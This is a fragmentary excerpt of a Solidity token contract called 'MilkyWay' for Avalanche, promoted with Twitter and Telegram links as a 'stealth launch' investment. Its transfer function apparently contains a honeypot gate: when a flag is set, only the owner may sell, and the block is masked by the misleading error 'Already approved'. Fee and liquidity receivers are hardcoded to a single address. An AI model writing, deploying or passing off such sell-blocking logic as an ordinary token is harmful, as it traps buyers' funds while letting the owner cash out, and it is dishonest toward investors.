...
*/
// Twitter: @MilkyWayAvax
// Telegram: https://t.me/MilkyWayAvax
// StealthLaunch Avax , NodeC And Univ Investment
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x19860CCB0A68fd4213aB9D8266F7bBf05A8dDe98); // rewards 
...
contract MilkyWay is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x19860CCB0A68fd4213aB9D8266F7bBf05A8dDe98; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "MilkyWay";
    string constant _symbol = "MilkyWay";
    ...
    address public autoLiquidityReceiver=0x53068dFC97Aa3A9a4c282Ec2C920f2434A7cEF65;
    address public marketingFeeReceiver=0x53068dFC97Aa3A9a4c282Ec2C920f2434A7cEF65;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!isSelling || sender==owner), "Already approved");
